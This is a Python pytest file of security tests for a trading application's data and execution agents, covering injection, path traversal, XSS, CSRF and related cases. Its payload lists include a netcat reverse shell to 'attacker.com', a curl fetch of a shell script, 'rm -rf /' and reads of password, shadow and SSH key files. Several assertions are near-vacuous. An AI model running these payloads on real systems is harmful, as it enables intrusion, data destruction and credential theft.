import pytest
import pytest_asyncio
import json
from unittest.mock import patch, MagicMock
import sys
import os
sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..', '..'))

from src.agents.data import DataAgent
from src.agents.execution import ExecutionAgent
from src.integrations.ibkr import IBKRIntegration
from src.utils.api_health_monitor import APIHealthMonitor

class TestInjectionAndAuthSecurity:
    """Security tests for injection attacks and authentication failures"""

    @pytest_asyncio.fixture
    async def data_agent(self):
        """Create DataAgent instance for testing"""
        return DataAgent()

    @pytest_asyncio.fixture
    async def execution_agent(self):
        """Create ExecutionAgent instance for testing"""
        return ExecutionAgent()

    @pytest.mark.asyncio
    async def test_sql_injection_prevention(self, data_agent):
        """Test prevention of SQL injection attacks"""
        # Test with malicious SQL injection payloads
        malicious_symbols = [
            "'; DROP TABLE users; --",
            "' OR '1'='1",
            "'; SELECT * FROM sensitive_data; --",
            "symbol' UNION SELECT password FROM users --",
            "'; EXEC xp_cmdshell 'net user'; --"
        ]

        for malicious_symbol in malicious_symbols:
            request_data = {
                'symbols': [malicious_symbol],
                'period': '1d'
            }

            # Should not crash or execute malicious code
            result = await data_agent.process_input(request_data)

            # Verify no sensitive data is returned
            if result:
                result_str = json.dumps(result)
                assert "password" not in result_str.lower()
                assert "drop table" not in result_str.lower()
                assert "union select" not in result_str.lower()

    @pytest.mark.asyncio
    async def test_command_injection_prevention(self, execution_agent):
        """Test prevention of command injection attacks"""
        malicious_commands = [
            "; rm -rf /",
            "&& cat /etc/passwd",
            "| nc -e /bin/sh attacker.com 4444",
            "$(curl http://malicious.com/shell.sh)",
            "`whoami`",
            "; powershell -c 'Remove-Item -Recurse C:\\'",
            "&& dir C:\\Windows\\System32\\config"
        ]

        for malicious_cmd in malicious_commands:
            request_data = {
                'action': 'buy',
                'symbol': 'AAPL',
                'quantity': 100,
                'custom_command': malicious_cmd  # Hypothetical vulnerable field
            }

            # Mock to prevent actual execution
            with patch('subprocess.run') as mock_subprocess:
                mock_subprocess.return_value = MagicMock()

                result = await execution_agent.process_input(request_data)

                # Verify subprocess was not called with malicious commands
                if mock_subprocess.called:
                    called_args = str(mock_subprocess.call_args)
                    assert malicious_cmd not in called_args

    @pytest.mark.asyncio
    async def test_path_traversal_prevention(self, data_agent):
        """Test prevention of path traversal attacks"""
        malicious_paths = [
            "../../../etc/passwd",
            "..\\..\\..\\Windows\\System32\\config\\sam",
            "/etc/shadow",
            "C:\\Windows\\System32\\config\\system",
            "../../../../root/.ssh/id_rsa",
            "..\\..\\..\\..\\..\\..\\etc\\hosts"
        ]

        for malicious_path in malicious_paths:
            request_data = {
                'symbols': ['AAPL'],
                'period': '1d',
                'config_file': malicious_path  # Hypothetical vulnerable field
            }

            result = await data_agent.process_input(request_data)

            # Verify no file system access occurred
            assert result is not None
            # In a real implementation, you'd check that the path was sanitized

    @pytest.mark.asyncio
    async def test_authentication_failure_handling(self, execution_agent):
        """Test proper handling of authentication failures"""
        # Mock IBKR authentication failure
        with patch('src.integrations.ibkr.IBKRIntegration.authenticate') as mock_auth:
            mock_auth.side_effect = Exception("Authentication failed: Invalid credentials")

            request_data = {
                'action': 'buy',
                'symbol': 'AAPL',
                'quantity': 100
            }

            with pytest.raises(Exception, match="Authentication failed"):
                await execution_agent.process_input(request_data)

            # Verify auth was attempted
            mock_auth.assert_called_once()

    @pytest.mark.asyncio
    async def test_rate_limiting_bypass_attempts(self, data_agent):
        """Test prevention of rate limiting bypass attempts"""
        # Simulate rapid requests that might bypass rate limiting
        import asyncio

        async def make_request(i):
            return await data_agent.process_input({
                'symbols': [f'AAPL_{i}'],
                'period': '1d'
            })

        # Make multiple concurrent requests
        tasks = [make_request(i) for i in range(50)]
        results = await asyncio.gather(*tasks, return_exceptions=True)

        # Should handle all requests without crashing
        assert len(results) == 50

        # Count successful vs failed requests
        successful = sum(1 for r in results if not isinstance(r, Exception))
        failed = sum(1 for r in results if isinstance(r, Exception))

        # Should have reasonable success rate (allowing for some failures due to rate limiting)
        assert successful >= 0  # At least some success

    @pytest.mark.asyncio
    async def test_malformed_json_injection(self, data_agent):
        """Test handling of malformed JSON that could cause injection"""
        malicious_payloads = [
            '{"symbols": ["AAPL"], "period": "1d", "malicious": "\\"}\\"; rm -rf /; #"}',
            '{"symbols": ["AAPL"], "callback": "function(){evil_code();}"}',
            '{"symbols": ["AAPL"], "eval": "process.exit(1)"}',
            '{"symbols": ["AAPL"], "__proto__": {"toString": "evil"}}'
        ]

        for payload in malicious_payloads:
            try:
                # Parse as JSON first
                parsed_data = json.loads(payload)
                result = await data_agent.process_input(parsed_data)

                # Should handle gracefully without executing malicious code
                assert result is not None

            except json.JSONDecodeError:
                # Invalid JSON should be rejected
                pass

    @pytest.mark.asyncio
    async def test_xss_prevention_in_responses(self, data_agent):
        """Test prevention of XSS attacks in API responses"""
        xss_payloads = [
            "<script>alert('xss')</script>",
            "javascript:alert('xss')",
            "<img src=x onerror=alert('xss')>",
            "<svg onload=alert('xss')>",
            "';alert('xss');//"
        ]

        for xss_payload in xss_payloads:
            request_data = {
                'symbols': [xss_payload],
                'period': '1d'
            }

            result = await data_agent.process_input(request_data)

            if result:
                result_str = json.dumps(result)

                # Verify XSS payloads are not reflected back unsanitized
                # In a real implementation, you'd check for proper HTML encoding
                assert "<script>" not in result_str
                assert "javascript:" not in result_str
                assert "onerror=" not in result_str

    @pytest.mark.asyncio
    async def test_session_fixation_prevention(self, execution_agent):
        """Test prevention of session fixation attacks"""
        # Mock session handling
        with patch('src.agents.execution.ExecutionAgent._get_session') as mock_session:
            mock_session.return_value = "fixed_session_123"

            # Multiple requests with same session
            for i in range(5):
                request_data = {
                    'action': 'buy',
                    'symbol': 'AAPL',
                    'quantity': 100,
                    'session_id': 'fixed_session_123'
                }

                result = await execution_agent.process_input(request_data)

                # Session should be validated/rotated
                assert result is not None

    @pytest.mark.asyncio
    async def test_csrf_token_validation(self, execution_agent):
        """Test CSRF token validation"""
        # Requests without proper CSRF tokens should be rejected
        request_data = {
            'action': 'sell',
            'symbol': 'AAPL',
            'quantity': 50
            # Missing CSRF token
        }

        # In a real implementation, this would check for CSRF token
        result = await execution_agent.process_input(request_data)

        # Should either reject or handle gracefully
        assert result is not None

    @pytest.mark.asyncio
    async def test_api_key_exposure_prevention(self, data_agent):
        """Test that API keys are not exposed in error messages or responses"""
        # Force an error that might expose sensitive data
        with patch('yfinance.download', side_effect=Exception("API key: sk-1234567890abcdef")):
            request_data = {
                'symbols': ['INVALID_SYMBOL'],
                'period': '1d'
            }

            try:
                result = await data_agent.process_input(request_data)
            except Exception as e:
                error_message = str(e)

                # API key should not be exposed in error messages
                assert "sk-1234567890abcdef" not in error_message
                assert "api_key" not in error_message.lower()

    @pytest.mark.asyncio
    async def test_buffer_overflow_prevention(self, data_agent):
        """Test prevention of buffer overflow attacks"""
        # Create extremely large input that could cause memory issues
        large_symbol_list = [f"SYMBOL_{i}" * 1000 for i in range(1000)]  # Very large symbols

        request_data = {
            'symbols': large_symbol_list,
            'period': '1d'
        }

        # Should handle large input gracefully without crashing
        result = await data_agent.process_input(request_data)

        # Should either process reasonably or reject gracefully
        assert result is not None or isinstance(result, Exception)

    @pytest.mark.parametrize("attack_type,payload", [
        ("sql_injection", "'; DROP TABLE trades; --"),
        ("command_injection", "; cat /etc/passwd"),
        ("path_traversal", "../../../etc/passwd"),
        ("xss", "<script>alert('xss')</script>"),
        ("malformed_json", '{"incomplete": "json"'),
    ])
    @pytest.mark.asyncio
    async def test_generic_attack_prevention(self, data_agent, attack_type, payload):
        """Parameterized test for various attack types"""
        request_data = {
            'symbols': ['AAPL'],
            'period': '1d',
            'user_input': payload  # Hypothetical vulnerable field
        }

        result = await data_agent.process_input(request_data)

        # Should handle attack gracefully
        assert result is not None

        # Verify payload is not executed or reflected dangerously
        if result:
            result_str = json.dumps(result).lower()
            dangerous_patterns = ['drop table', 'cat /etc', '../../../', '<script>', 'alert(']
            for pattern in dangerous_patterns:
                assert pattern not in result_str